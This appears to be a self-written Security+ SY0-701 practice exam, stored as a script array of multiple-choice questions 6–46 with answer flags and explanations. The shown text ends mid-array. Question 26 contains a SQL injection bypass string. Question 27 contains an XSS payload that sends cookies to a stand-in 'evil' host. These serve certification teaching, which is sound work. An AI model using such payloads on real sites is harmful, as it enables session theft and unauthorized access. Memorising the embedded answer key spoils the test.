---
title: Practice Exam D — Original SY0-701 Drill
category: practice-exam
tags: [practice-exam, full-exam, sy0-701]
status: active
confidence: high
created: 2026-05-22
updated: 2026-05-23
covers: 
source: Original content, written for SY0-701 objectives
---

# Practice Exam D — Original SY0-701 Drill

**Original** practice exam covering the same SY0-701 objectives and domain distribution as [[quizzes/practice-exam-a|Practice Exam A]]. **85 multiple-choice questions** (B6–B90) plus **5 performance-based questions** (B1–B5) — written from scratch, not drawn from any published exam.

> Use this alongside any published Messer practice exams you take. The point is volume and breadth across the objectives, not duplication.

**How this works:** same harness as Practice Exam A. PBQs first as interactive widgets, then MCQs. **No feedback as you go** — hit **Grade my test** at the bottom and a full report card with per-question feedback drops in at the top.

Pass-line reference: roughly **75–83%** on the MCQs (CompTIA's scaled pass is around 750/900 ≈ 83%).

```dataviewjs
const questions = [
{"n":6,"q":"A facility has a sign at the perimeter reading 'TRESPASSERS WILL BE PROSECUTED.' What type of security control is this sign?","opts":[{"l":"A","t":"Preventive","c":false,"w":"Preventive controls actually block access — a fence or locked gate. A sign by itself doesn't physically stop anyone."},{"l":"B","t":"Deterrent","c":true,"w":"Deterrent controls discourage but don't physically stop. Warning signs are the classic example."},{"l":"C","t":"Compensating","c":false,"w":"Compensating substitutes for a missing control. A sign isn't substituting for anything in this scenario."},{"l":"D","t":"Corrective","c":false,"w":"Corrective controls act after an incident — backups, patches, restorations. A sign predates any incident."}],"topic":"SY0-701, Objective 1.1 - Security Controls","url":"https://professormesser.link/701010101","objective":"1.1","domain":"1"},
{"n":7,"q":"A company's policy requires monthly access-review meetings where managers must re-approve every direct report's permissions. Classify this control along the category axis.","opts":[{"l":"A","t":"Technical","c":false,"w":"Technical controls are enforced by systems (firewalls, ACLs). A monthly meeting isn't system-enforced."},{"l":"B","t":"Managerial","c":true,"w":"Policies and procedures executed by people — including periodic reviews — are managerial controls."},{"l":"C","t":"Operational","c":false,"w":"Operational controls are day-to-day human actions like a guard checking badges. A scheduled review is one step up — it's a policy."},{"l":"D","t":"Physical","c":false,"w":"Physical controls involve tangible barriers (locks, fences). Access reviews are paperwork."}],"topic":"SY0-701, Objective 1.1 - Security Controls","url":"https://professormesser.link/701010101","objective":"1.1","domain":"1"},
{"n":8,"q":"A security team places a deliberately weak file server with realistic-looking documents on a segmented network. The system has no business purpose. Which concept does this BEST illustrate?","opts":[{"l":"A","t":"Honeypot","c":true,"w":"A honeypot is a decoy designed to attract and study attackers. A single fake system on its own network segment fits the definition."},{"l":"B","t":"Honeynet","c":false,"w":"A honeynet is multiple honeypots forming a network of decoys. The scenario describes one system."},{"l":"C","t":"Honeyfile","c":false,"w":"A honeyfile is a single trap document inside a real system — it triggers alerts when accessed."},{"l":"D","t":"Sinkhole","c":false,"w":"A DNS sinkhole redirects malicious domains to a non-routable address. Different mechanism entirely."}],"topic":"SY0-701, Objective 1.2 - Deception and Disruption","url":"https://professormesser.link/701010207","objective":"1.2","domain":"1"},
{"n":9,"q":"Engineering wants to redesign their network so that no device is trusted by default based on its location, and every request must be authenticated and authorized regardless of where it originates. This model is best described as:","opts":[{"l":"A","t":"Defense in depth","c":false,"w":"Defense in depth is layering controls. Zero trust includes layering but is specifically about removing implicit trust."},{"l":"B","t":"Air gap","c":false,"w":"Air gap means physical network isolation. The scenario describes an authentication model, not isolation."},{"l":"C","t":"Zero trust","c":true,"w":"Zero trust removes implicit network trust — every request is verified by identity and posture, not by source network."},{"l":"D","t":"Segmentation","c":false,"w":"Segmentation breaks the network into zones. Zero trust often uses segmentation, but the question describes the trust model, not the network shape."}],"topic":"SY0-701, Objective 1.2 - Zero Trust","url":"https://professormesser.link/701010205","objective":"1.2","domain":"1"},
{"n":10,"q":"Which of the following BEST describes the role of a policy enforcement point (PEP) in a zero-trust architecture?","opts":[{"l":"A","t":"Stores all user identity attributes","c":false,"w":"Identity attributes live in an identity provider / directory, not the PEP."},{"l":"B","t":"Decides whether a given request should be permitted","c":false,"w":"Tempting, but the deciding role is the policy DECISION point (PDP). The PEP is the actuator."},{"l":"C","t":"Enforces the decision by allowing or blocking the request in-line","c":true,"w":"The PEP sits in the data path. It asks the PDP for a decision and then enforces it on the wire."},{"l":"D","t":"Trains users on acceptable-use rules","c":false,"w":"That's awareness training, not a technical zero-trust component."}],"topic":"SY0-701, Objective 1.2 - Zero Trust","url":"https://professormesser.link/701010205","objective":"1.2","domain":"1"},
{"n":11,"q":"An engineering team is about to push a database migration to production. The change-management process requires identifying all systems that depend on the database. Which step does this represent?","opts":[{"l":"A","t":"Backout plan","c":false,"w":"The backout plan covers how to revert if the change fails — not what depends on it."},{"l":"B","t":"Impact analysis","c":true,"w":"Mapping downstream dependencies is the heart of impact analysis. You can't approve a change without knowing what it touches."},{"l":"C","t":"Approval","c":false,"w":"Approval is sign-off, which comes after impact analysis."},{"l":"D","t":"Test plan","c":false,"w":"The test plan covers how the change will be validated, not what depends on it."}],"topic":"SY0-701, Objective 1.3 - Change Management Process","url":"https://professormesser.link/701010301","objective":"1.3","domain":"1"},
{"n":12,"q":"A company's change management process specifies that all firewall rule changes must happen during a 2-hour window between 02:00 and 04:00 every Sunday. This window is BEST described as:","opts":[{"l":"A","t":"Service-level agreement","c":false,"w":"An SLA describes uptime/performance commitments, not change timing."},{"l":"B","t":"Maintenance window","c":true,"w":"Pre-scheduled time slots reserved for changes are maintenance windows. They contain disruption risk to a known period."},{"l":"C","t":"Standard operating procedure","c":false,"w":"An SOP is a step-by-step procedure — the window is when those procedures run, not the procedures themselves."},{"l":"D","t":"Risk register entry","c":false,"w":"A risk register entry catalogues a specific risk. A recurring maintenance schedule isn't a risk entry."}],"topic":"SY0-701, Objective 1.3 - Change Management Process","url":"https://professormesser.link/701010301","objective":"1.3","domain":"1"},
{"n":13,"q":"A messaging app advertises 'end-to-end encryption.' What property does this provide that transport encryption alone does not?","opts":[{"l":"A","t":"Faster message delivery","c":false,"w":"E2EE often adds slight overhead; speed isn't the benefit."},{"l":"B","t":"The server operator cannot read message contents","c":true,"w":"E2EE means only sender and recipient hold keys. Transport encryption (TLS) only protects the message in flight — the server can still see it."},{"l":"C","t":"Messages are stored permanently","c":false,"w":"Retention is a separate policy. E2EE doesn't dictate retention."},{"l":"D","t":"Authentication of the sender's identity","c":false,"w":"E2EE can be paired with sender authentication, but the protection it provides is content confidentiality from intermediaries."}],"topic":"SY0-701, Objective 1.4 - Encrypting Data","url":"https://professormesser.link/701010402","objective":"1.4","domain":"1"},
{"n":14,"q":"Two parties want to establish a shared symmetric key over an untrusted network without ever transmitting the key itself. Which technique BEST fits?","opts":[{"l":"A","t":"Diffie-Hellman key exchange","c":true,"w":"DH lets two parties derive a shared secret from public-key math; the secret itself never crosses the wire."},{"l":"B","t":"AES-256","c":false,"w":"AES is a symmetric cipher used AFTER a key is established — it doesn't establish the key."},{"l":"C","t":"SHA-256","c":false,"w":"SHA is a hashing function. Not used for key establishment."},{"l":"D","t":"HMAC","c":false,"w":"HMAC requires a shared key — it doesn't establish one."}],"topic":"SY0-701, Objective 1.4 - Public Key Infrastructure","url":"https://professormesser.link/701010401","objective":"1.4","domain":"1"},
{"n":15,"q":"A developer is choosing between RSA and ECC for signing artifacts. The system runs on resource-constrained IoT devices. Which factor MOST favors ECC?","opts":[{"l":"A","t":"Wider library support across legacy systems","c":false,"w":"RSA actually has wider legacy support — that's an argument for RSA, not ECC."},{"l":"B","t":"Stronger security per bit, allowing smaller keys for equivalent strength","c":true,"w":"A 256-bit ECC key offers comparable security to a 3072-bit RSA key. Less CPU and less memory — ideal for IoT."},{"l":"C","t":"Simpler mathematics for hand-verification","c":false,"w":"Both are non-trivial to verify by hand; not a real factor."},{"l":"D","t":"Faster on legacy 32-bit hardware than RSA","c":false,"w":"Performance depends on implementation. The dominant ECC advantage is key size, not raw speed on legacy hardware."}],"topic":"SY0-701, Objective 1.4 - Encrypting Data","url":"https://professormesser.link/701010402","objective":"1.4","domain":"1"},
{"n":16,"q":"A team is implementing storage encryption. Which level encrypts every block written to disk transparently, including the operating system itself?","opts":[{"l":"A","t":"File-level encryption","c":false,"w":"File-level encrypts individual files. The OS partition would not normally be one of them."},{"l":"B","t":"Database encryption (column-level)","c":false,"w":"Column-level encrypts specific database columns. Disk-wide it is not."},{"l":"C","t":"Full-disk encryption","c":true,"w":"FDE (e.g., BitLocker, LUKS) encrypts the entire disk including the OS volume. Decryption happens at boot via the trusted boot chain."},{"l":"D","t":"Transport encryption","c":false,"w":"Transport encryption protects data in motion, not at rest."}],"topic":"SY0-701, Objective 1.4 - Encrypting Data","url":"https://professormesser.link/701010402","objective":"1.4","domain":"1"},
{"n":17,"q":"A company uses a hardware-rooted device that securely stores and manages cryptographic keys for high-volume server-side TLS termination. Which device matches this description?","opts":[{"l":"A","t":"TPM","c":false,"w":"TPMs are per-device chips, generally not designed for high-volume key operations across a fleet."},{"l":"B","t":"HSM","c":true,"w":"An HSM is a hardened, often networked appliance built for high-volume key operations and tamper-resistant key storage. Common at TLS termination points."},{"l":"C","t":"Secure enclave","c":false,"w":"Secure enclaves are CPU features (e.g., Apple's, Intel SGX) — per-device, not server-side appliances."},{"l":"D","t":"Key escrow","c":false,"w":"Key escrow is the practice of depositing keys with a third party — not a hardware device."}],"topic":"SY0-701, Objective 1.4 - Encryption Technologies","url":"https://professormesser.link/701010404","objective":"1.4","domain":"1"},
{"n":18,"q":"A compensating control is BEST described as:","opts":[{"l":"A","t":"A control that prevents an action before it happens","c":false,"w":"That's a preventive control."},{"l":"B","t":"A control that detects and alerts on an action that has occurred","c":false,"w":"That's a detective control."},{"l":"C","t":"An alternative control that addresses a risk when the primary control isn't feasible","c":true,"w":"Compensating controls substitute for the ideal control. Example: extra logging when you can't deploy the proper patch yet."},{"l":"D","t":"A control that defines required behavior via written policy","c":false,"w":"That's a directive control."}],"topic":"SY0-701, Objective 1.1 - Security Controls","url":"https://professormesser.link/701010101","objective":"1.1","domain":"1"},
{"n":19,"q":"What is the primary purpose of a salt in password hashing?","opts":[{"l":"A","t":"Make the hash easier to verify","c":false,"w":"Salts don't make verification easier; they just add a known random value to the input."},{"l":"B","t":"Encrypt the password instead of hashing it","c":false,"w":"Salts don't encrypt — they're added to the input before hashing."},{"l":"C","t":"Ensure that two users with the same password produce different hashes","c":true,"w":"Per-user salts make precomputed rainbow tables useless and prevent attackers from spotting shared passwords across users."},{"l":"D","t":"Replace the need for a strong password policy","c":false,"w":"Salting doesn't help against guessing a weak password individually; it just stops cross-user inference."}],"topic":"SY0-701, Objective 1.4 - Hashing and Digital Signatures","url":"https://professormesser.link/701010406","objective":"1.4","domain":"1"},
{"n":20,"q":"A small company implements a 'least privilege' model on its file server. Which behavior BEST demonstrates this principle in practice?","opts":[{"l":"A","t":"All employees can read every shared file by default","c":false,"w":"That's the opposite — most-privilege defaults."},{"l":"B","t":"Each employee's account has only the file-share access required for their job duties","c":true,"w":"Least privilege grants exactly what's needed for the role — no more, no less."},{"l":"C","t":"Administrators use their privileged accounts for daily email and browsing","c":false,"w":"That violates least privilege at the admin level. Admins should use standard accounts for routine work and elevate only when needed."},{"l":"D","t":"Every user gets local admin to reduce help-desk tickets","c":false,"w":"Convenient, but expensive in compromise blast radius — direct contradiction of least privilege."}],"topic":"SY0-701, Objective 1.2 - Fundamental Security Concepts","url":"https://professormesser.link/701010202","objective":"1.2","domain":"1"},
{"n":21,"q":"A breach is traced to an employee who knowingly shared confidential documents with a competitor in exchange for payment. Which threat actor classification fits BEST?","opts":[{"l":"A","t":"Hacktivist","c":false,"w":"Hacktivists are motivated by ideology, not money."},{"l":"B","t":"Malicious insider","c":true,"w":"An employee with authorized access who deliberately abuses it for personal gain is the textbook malicious insider."},{"l":"C","t":"Script kiddie","c":false,"w":"Script kiddies typically lack the access this scenario describes."},{"l":"D","t":"Nation-state","c":false,"w":"Nation-state actors target strategic objectives, often without payment to individual employees — and the actor here is the employee, not a sponsor."}],"topic":"SY0-701, Objective 2.1 - Threat Actors","url":"https://professormesser.link/701020101","objective":"2.1","domain":"2"},
{"n":22,"q":"Which of the following BEST distinguishes a nation-state actor from organized crime?","opts":[{"l":"A","t":"Nation-state actors are louder; they want to be noticed","c":false,"w":"Generally the opposite — nation-states often prize stealth and persistence."},{"l":"B","t":"Organized crime is funded by foreign governments","c":false,"w":"Organized crime is generally self-funded through criminal proceeds."},{"l":"C","t":"Nation-state actors are typically well-resourced, patient, and pursue strategic rather than financial goals","c":true,"w":"Nation-states have time, money, and people. Their goals are intelligence, disruption, or strategic advantage — not immediate revenue."},{"l":"D","t":"Organized crime targets only individuals, never companies","c":false,"w":"Organized crime targets whatever's profitable, including companies and infrastructure."}],"topic":"SY0-701, Objective 2.1 - Threat Actors","url":"https://professormesser.link/701020101","objective":"2.1","domain":"2"},
{"n":23,"q":"An attacker calls the help desk pretending to be a senior executive and pressures the technician to reset a password 'immediately for an urgent board meeting.' Which social engineering principle is the attacker exploiting MOST?","opts":[{"l":"A","t":"Scarcity","c":false,"w":"Scarcity is about limited supply/time. Authority pressure is the dominant lever here."},{"l":"B","t":"Authority and urgency","c":true,"w":"Impersonating a high-status person AND creating time pressure are two of the most effective social engineering levers, combined here."},{"l":"C","t":"Familiarity","c":false,"w":"Familiarity is about prior relationships. The attacker is impersonating someone the technician likely doesn't know personally."},{"l":"D","t":"Consensus","c":false,"w":"Consensus is 'everyone else is doing it.' Not the lever in this scenario."}],"topic":"SY0-701, Objective 2.2 - Social Engineering","url":"https://professormesser.link/701020204","objective":"2.2","domain":"2"},
{"n":24,"q":"A user receives a text message claiming to be from their bank, asking them to click a link and 'confirm a suspicious transaction.' What is this attack called?","opts":[{"l":"A","t":"Vishing","c":false,"w":"Vishing is phishing over voice/phone."},{"l":"B","t":"Smishing","c":true,"w":"Smishing is phishing over SMS (text messages). Same playbook as email phishing, different channel."},{"l":"C","t":"Pharming","c":false,"w":"Pharming redirects users to fake sites via DNS or hosts-file manipulation — no inbound message required."},{"l":"D","t":"Whaling","c":false,"w":"Whaling targets senior executives specifically. The channel and target population don't fit."}],"topic":"SY0-701, Objective 2.2 - Phishing","url":"https://professormesser.link/701020202","objective":"2.2","domain":"2"},
{"n":25,"q":"Which of the following is the BEST example of a watering-hole attack?","opts":[{"l":"A","t":"An attacker sends millions of generic phishing emails hoping for clicks","c":false,"w":"That's mass phishing. No targeting."},{"l":"B","t":"An attacker compromises an industry forum frequented by the target's employees, planting malware to infect visitors","c":true,"w":"Watering hole = compromise a site the target audience already trusts and visits. Pre-position malware and wait."},{"l":"C","t":"An attacker physically tailgates an employee through a secured door","c":false,"w":"That's tailgating / piggybacking — a physical attack."},{"l":"D","t":"An attacker tries the same password across many user accounts","c":false,"w":"That's password spraying — a credential attack."}],"topic":"SY0-701, Objective 2.2 - Phishing","url":"https://professormesser.link/701020202","objective":"2.2","domain":"2"},
{"n":26,"q":"A web application accepts user input and inserts it directly into a SQL query string without parameterization. An attacker submits `' OR 1=1 --` in a login form and gains entry. This vulnerability is BEST described as:","opts":[{"l":"A","t":"Cross-site scripting","c":false,"w":"XSS injects script into web pages viewed by other users. This attack injects into a database query."},{"l":"B","t":"Buffer overflow","c":false,"w":"Buffer overflows manipulate memory bounds. This is a logic-layer string injection."},{"l":"C","t":"SQL injection","c":true,"w":"User input flowing unsanitized into a SQL query is the textbook SQL injection vulnerability. Parameterized queries fix it."},{"l":"D","t":"Race condition","c":false,"w":"Race conditions exploit timing between operations — unrelated to this attack pattern."}],"topic":"SY0-701, Objective 2.3 - SQL Injection","url":"https://professormesser.link/701020306","objective":"2.3","domain":"2"},
{"n":27,"q":"A web app's profile page renders the user's display name without HTML-escaping. An attacker sets their display name to `<script>document.location='https://evil/?c='+document.cookie</script>`. When other users view that profile, their browsers execute the script. Which vulnerability category is this?","opts":[{"l":"A","t":"Stored XSS","c":true,"w":"The script is stored server-side (in the display name) and then served to other users — classic stored cross-site scripting."},{"l":"B","t":"Reflected XSS","c":false,"w":"Reflected XSS bounces input back from a single request — typically via URL parameters. Here it's persistently stored."},{"l":"C","t":"CSRF","c":false,"w":"CSRF tricks a user's browser into making authenticated requests. This attack runs code in the victim's browser, not actions on their behalf."},{"l":"D","t":"SQL injection","c":false,"w":"No SQL is being injected — this is HTML/JS rendering in the browser."}],"topic":"SY0-701, Objective 2.3 - Cross-Site Scripting","url":"https://professormesser.link/701020307","objective":"2.3","domain":"2"},
{"n":28,"q":"A vendor announces that a vulnerability in their proprietary appliance has no available patch and won't have one — the product line is end-of-life. Which mitigation is MOST appropriate?","opts":[{"l":"A","t":"Wait for the next quarterly patch cycle","c":false,"w":"There won't be one. EOL means support is over."},{"l":"B","t":"Add compensating controls (segmentation, monitoring, traffic filters) until the device can be replaced","c":true,"w":"When you can't fix the asset, wrap it. Compensating controls reduce risk while you plan replacement."},{"l":"C","t":"Increase the device's network exposure to test it more thoroughly","c":false,"w":"That increases risk; the opposite of mitigation."},{"l":"D","t":"Document acceptance of the risk and continue using the device unchanged","c":false,"w":"Pure risk acceptance for a known unpatched vulnerability on a network-connected device is rarely acceptable. Add compensating controls first."}],"topic":"SY0-701, Objective 2.3 - Hardware vulnerabilities","url":"https://professormesser.link/701020308","objective":"2.3","domain":"2"},
{"n":29,"q":"A specific vulnerability has been publicly disclosed but no patch is yet available, and active exploits are circulating. Which term describes this window?","opts":[{"l":"A","t":"Zero-day","c":true,"w":"A zero-day is a vulnerability being exploited (or publicly known) before the vendor has had time to patch it — 'day zero' of patch availability."},{"l":"B","t":"CVE","c":false,"w":"CVE is the catalog identifier — a vuln has a CVE whether it's zero-day or 10 years old."},{"l":"C","t":"End-of-life","c":false,"w":"EOL means the product is no longer supported. Distinct from patch timing for in-support products."},{"l":"D","t":"Misconfiguration","c":false,"w":"Misconfiguration is a different vulnerability class — operator error rather than a software defect."}],"topic":"SY0-701, Objective 2.3 - Vulnerabilities","url":"https://professormesser.link/701020310","objective":"2.3","domain":"2"},
{"n":30,"q":"An attacker captures encrypted Kerberos authentication packets from a network tap and later replays them to gain access. What category of attack is this?","opts":[{"l":"A","t":"Brute-force attack","c":false,"w":"Brute force tries credentials directly. Replay sends recorded authentic-looking traffic."},{"l":"B","t":"Replay attack","c":true,"w":"Capturing real authentication traffic and re-transmitting it is the definition of a replay attack. Mitigated with nonces/timestamps."},{"l":"C","t":"DNS poisoning","c":false,"w":"DNS poisoning manipulates name resolution. Different attack class."},{"l":"D","t":"Privilege escalation","c":false,"w":"Privilege escalation elevates an existing foothold. Replay establishes (or re-establishes) access."}],"topic":"SY0-701, Objective 2.4 - Network Attacks","url":"https://professormesser.link/701020405","objective":"2.4","domain":"2"},
{"n":31,"q":"Botnets are MOST commonly used for which type of attack?","opts":[{"l":"A","t":"DDoS amplification","c":true,"w":"Distributed denial-of-service is the canonical botnet use case — many compromised hosts firing traffic at one target."},{"l":"B","t":"Single-source phishing","c":false,"w":"Phishing doesn't typically require a botnet."},{"l":"C","t":"Local privilege escalation","c":false,"w":"Local privesc happens on one host. Botnets are about coordinating many."},{"l":"D","t":"Side-channel cache attacks","c":false,"w":"Side-channel attacks are surgical and local — not what botnets do."}],"topic":"SY0-701, Objective 2.4 - Denial of Service","url":"https://professormesser.link/701020406","objective":"2.4","domain":"2"},
{"n":32,"q":"Malware that demands payment in cryptocurrency in exchange for decrypting a victim's files is called:","opts":[{"l":"A","t":"Spyware","c":false,"w":"Spyware covertly collects information. It doesn't typically encrypt and ransom."},{"l":"B","t":"Rootkit","c":false,"w":"Rootkits hide attacker presence at low levels of the OS. They don't demand payment."},{"l":"C","t":"Ransomware","c":true,"w":"Encrypt-and-extort is the defining behavior of ransomware. Crypto payment makes attribution harder."},{"l":"D","t":"Worm","c":false,"w":"Worms self-propagate. Ransomware may use worm-like propagation but the ransom is the distinguishing trait."}],"topic":"SY0-701, Objective 2.4 - Malware","url":"https://professormesser.link/701020401","objective":"2.4","domain":"2"},
{"n":33,"q":"A user reports that their computer began running slowly and showing pop-ups after they installed a free 'system optimizer.' Closer inspection finds the tool legitimately defragments their disk but also logs keystrokes in the background. This malware is BEST classified as:","opts":[{"l":"A","t":"Worm","c":false,"w":"Worms propagate themselves over networks. No propagation is described."},{"l":"B","t":"Trojan","c":true,"w":"A Trojan disguises itself as something the user wants (a system optimizer) and ships something they don't (a keylogger). Concealment is the hallmark."},{"l":"C","t":"Ransomware","c":false,"w":"No encryption or ransom demand."},{"l":"D","t":"Rootkit","c":false,"w":"Rootkits operate at kernel/firmware level for stealth. The scenario doesn't describe that depth."}],"topic":"SY0-701, Objective 2.4 - Malware","url":"https://professormesser.link/701020401","objective":"2.4","domain":"2"},
{"n":34,"q":"An adversary spends six months quietly establishing footholds in a defense contractor's network, exfiltrating documents weekly, and rotating C2 infrastructure to avoid detection. Which threat profile fits BEST?","opts":[{"l":"A","t":"Script kiddie","c":false,"w":"Script kiddies use off-the-shelf tools and rarely sustain long-term presence."},{"l":"B","t":"Advanced persistent threat (APT)","c":true,"w":"Long-dwell, well-resourced, stealthy, strategic-target attackers are the textbook APT profile."},{"l":"C","t":"Insider threat","c":false,"w":"No insider involvement is described."},{"l":"D","t":"Hacktivist","c":false,"w":"Hacktivists generally favor public disruption, not silent multi-month exfiltration."}],"topic":"SY0-701, Objective 2.4 - Threat Actors","url":"https://professormesser.link/701020101","objective":"2.4","domain":"2"},
{"n":35,"q":"A security team discovers that domain-joined laptops have inconsistent local firewall settings. Which Windows-environment tool is the MOST appropriate to enforce a consistent baseline?","opts":[{"l":"A","t":"Group Policy","c":true,"w":"Group Policy is the centralized configuration mechanism for domain-joined Windows endpoints. Firewall settings are a standard GPO target."},{"l":"B","t":"DNS filtering","c":false,"w":"DNS filtering blocks domain resolution. It doesn't manage host firewall configuration."},{"l":"C","t":"DLP","c":false,"w":"DLP focuses on data movement, not firewall settings."},{"l":"D","t":"SIEM","c":false,"w":"SIEMs collect and correlate logs; they don't push configuration."}],"topic":"SY0-701, Objective 2.5 - Mitigation Techniques","url":"https://professormesser.link/701020502","objective":"2.5","domain":"2"},
{"n":36,"q":"A security team is hardening a Linux server. Which of the following BEST describes 'reducing the attack surface' on this host?","opts":[{"l":"A","t":"Adding more user accounts so individual blast radius is smaller","c":false,"w":"More accounts is more surface, not less."},{"l":"B","t":"Disabling and removing services and ports not required by the host's role","c":true,"w":"Removing unneeded services, packages, listening ports, and accounts is the textbook surface-reduction action."},{"l":"C","t":"Enabling all available logging sources","c":false,"w":"More logging is good for detection but doesn't shrink the attack surface."},{"l":"D","t":"Increasing CPU and RAM allocation","c":false,"w":"Resources have nothing to do with attack surface."}],"topic":"SY0-701, Objective 2.5 - Hardening","url":"https://professormesser.link/701020503","objective":"2.5","domain":"2"},
{"n":37,"q":"Network segmentation reduces the impact of a single host compromise by:","opts":[{"l":"A","t":"Preventing all malware infections by default","c":false,"w":"Segmentation doesn't prevent infection. It limits its spread."},{"l":"B","t":"Limiting which other hosts the compromised system can reach","c":true,"w":"Segments restrict east-west traffic. A compromised host in a tight segment has nowhere to go."},{"l":"C","t":"Increasing the speed of patches across the fleet","c":false,"w":"Patching speed is unrelated to segmentation."},{"l":"D","t":"Eliminating the need for endpoint security on segmented hosts","c":false,"w":"Defense in depth still applies inside segments."}],"topic":"SY0-701, Objective 2.5 - Segmentation and Access Control","url":"https://professormesser.link/701020501","objective":"2.5","domain":"2"},
{"n":38,"q":"An attacker successfully logs in by typing the same common password ('Spring2025!') across hundreds of usernames, one attempt each, to avoid account lockout thresholds. This is called:","opts":[{"l":"A","t":"Brute force","c":false,"w":"Brute force tries many passwords against ONE account. This goes the other direction."},{"l":"B","t":"Password spraying","c":true,"w":"Spraying tries ONE password across MANY accounts. Designed specifically to dodge per-account lockouts."},{"l":"C","t":"Credential stuffing","c":false,"w":"Stuffing reuses leaked username/password PAIRS from other breaches. This scenario uses no leaked pairs."},{"l":"D","t":"Rainbow table attack","c":false,"w":"Rainbow tables crack hashes offline. The scenario describes live login attempts."}],"topic":"SY0-701, Objective 2.4 - Network Attacks","url":"https://professormesser.link/701020405","objective":"2.4","domain":"2"},
{"n":39,"q":"A company runs some workloads in AWS, others in Azure, and keeps a small set of regulated workloads on-premises. This deployment model is BEST described as:","opts":[{"l":"A","t":"Public cloud","c":false,"w":"Public cloud is a single public provider deployment. Not this."},{"l":"B","t":"Private cloud","c":false,"w":"Private cloud is a single self-hosted environment. Not this."},{"l":"C","t":"Multi-cloud with hybrid on-prem","c":true,"w":"Multi-cloud = more than one public provider. Hybrid = mix of cloud and on-prem. Both apply here."},{"l":"D","t":"Community cloud","c":false,"w":"Community cloud is a shared platform for organizations with common interests (e.g., government, healthcare). Doesn't fit the scenario."}],"topic":"SY0-701, Objective 3.1 - Cloud Infrastructures","url":"https://professormesser.link/701030101","objective":"3.1","domain":"3"},
{"n":40,"q":"Under the cloud shared responsibility model for an IaaS deployment, who is primarily responsible for patching the GUEST operating system?","opts":[{"l":"A","t":"The cloud provider","c":false,"w":"Provider patches the host hypervisor and the physical infrastructure. The guest OS is yours."},{"l":"B","t":"The customer","c":true,"w":"In IaaS the customer manages everything from the OS upward — including OS patching, configuration, applications, and data."},{"l":"C","t":"Shared 50/50","c":false,"w":"Guest OS responsibility is one-sided in IaaS, not split."},{"l":"D","t":"The cloud provider's hardware vendor","c":false,"w":"Hardware vendors don't manage live guest OSes."}],"topic":"SY0-701, Objective 3.1 - Cloud Infrastructures","url":"https://professormesser.link/701030101","objective":"3.1","domain":"3"},
{"n":41,"q":"A development team writes Terraform files describing their entire production environment and stores those files in Git. Each deployment runs the same Terraform plan. This practice is called:","opts":[{"l":"A","t":"Continuous integration","c":false,"w":"CI is about building and testing code on each commit. IaC is configuration-side."},{"l":"B","t":"Infrastructure as code","c":true,"w":"Defining infrastructure declaratively in version-controlled text files is the definition of IaC. Repeatable, reviewable, auditable."},{"l":"C","t":"Containerization","c":false,"w":"Containerization packages applications and dependencies. IaC describes the broader environment."},{"l":"D","t":"Microservices","c":false,"w":"Microservices is an application architecture pattern — distinct from how the infrastructure is described."}],"topic":"SY0-701, Objective 3.1 - Other Infrastructure Concepts","url":"https://professormesser.link/701030103","objective":"3.1","domain":"3"},
{"n":42,"q":"An organization places its public-facing web servers in a network zone separated from both the internet and the internal LAN by firewalls. This zone is commonly called a:","opts":[{"l":"A","t":"Honeynet","c":false,"w":"Honeynets are decoy networks, not service-hosting zones."},{"l":"B","t":"Screened subnet (DMZ)","c":true,"w":"DMZ / screened subnet is the standard term for a zone between two firewalls hosting services exposed to the internet."},{"l":"C","t":"Extranet","c":false,"w":"Extranet is a network accessible to specific external partners, not public users."},{"l":"D","t":"Intranet","c":false,"w":"Intranet is the private internal network — the opposite of a public-facing zone."}],"topic":"SY0-701, Objective 3.2 - Network Architecture","url":"https://professormesser.link/701030202","objective":"3.2","domain":"3"},
{"n":43,"q":"An IDS and an IPS differ PRIMARILY in:","opts":[{"l":"A","t":"The IDS detects attacks; the IPS detects AND can block them","c":true,"w":"IDS = detection only, alerts pass-through. IPS sits in-line and can drop, reset, or quarantine traffic."},{"l":"B","t":"IDS uses signatures; IPS uses anomaly detection only","c":false,"w":"Both can use either or both detection methods. Not the distinguishing axis."},{"l":"C","t":"IDS works on encrypted traffic; IPS does not","c":false,"w":"Both struggle with encrypted traffic similarly. Not the difference."},{"l":"D","t":"IDS is hardware-based; IPS is software-based","c":false,"w":"Both come in either form factor."}],"topic":"SY0-701, Objective 3.2 - Network Security Devices","url":"https://professormesser.link/701030203","objective":"3.2","domain":"3"},
{"n":44,"q":"A network engineer wants traffic between two office sites to traverse the public internet but be encrypted and authenticated end-to-end. The MOST appropriate technology is:","opts":[{"l":"A","t":"Site-to-site VPN","c":true,"w":"Site-to-site VPNs (typically IPsec) tunnel encrypted traffic between two networks over the public internet — exactly the described use case."},{"l":"B","t":"Reverse proxy","c":false,"w":"Reverse proxies front-end inbound web traffic. They don't generally tunnel inter-office traffic."},{"l":"C","t":"Forward proxy","c":false,"w":"Forward proxies sit between users and the internet. Different role."},{"l":"D","t":"Bastion host","c":false,"w":"Bastion hosts are hardened jump points for admin access — not site-to-site connectivity."}],"topic":"SY0-701, Objective 3.2 - Secure Communication","url":"https://professormesser.link/701030207","objective":"3.2","domain":"3"},
{"n":45,"q":"Which protocol secures DNS queries against eavesdropping by encrypting them inside an HTTPS connection?","opts":[{"l":"A","t":"DNSSEC","c":false,"w":"DNSSEC authenticates DNS responses but does NOT encrypt the queries. Different goal."},{"l":"B","t":"DoH (DNS over HTTPS)","c":true,"w":"DoH encapsulates DNS in HTTPS, encrypting query content from eavesdroppers on the path."},{"l":"C","t":"DNS over TCP","c":false,"w":"Plain TCP DNS isn't encrypted either."},{"l":"D","t":"Dynamic DNS","c":false,"w":"Dynamic DNS updates records automatically — unrelated to query confidentiality."}],"topic":"SY0-701, Objective 3.2 - Secure Communication","url":"https://professormesser.link/701030207","objective":"3.2","domain":"3"},
{"n":46,"q":"A company stores backup tapes at a regional vendor site 30 miles from headquarters. The data on those tapes is currently in which state?","opts":[{"l":"A","t":"Data in transit","c":false,"w":"In transit means actively moving across a network. Tapes sitting at a vendor are not in transit."},{"l":"B","t":"Data at rest","c":true,"w":"Stored data, whether on disk, tape, or any persistent medium, is data at rest."},{"l":"C","t":"Data in use","c":false,"w":"In use means actively in memory or being processed. Tapes are static."},{"l":"D","t":"Data in transformation","c":false,"w":"Not a standard CompTIA category."}],"topic":"SY0-701, Objective 3.3 - States of Data","url":"https://professormesser.link/701030302","objective":"3.3","domain":"3"},
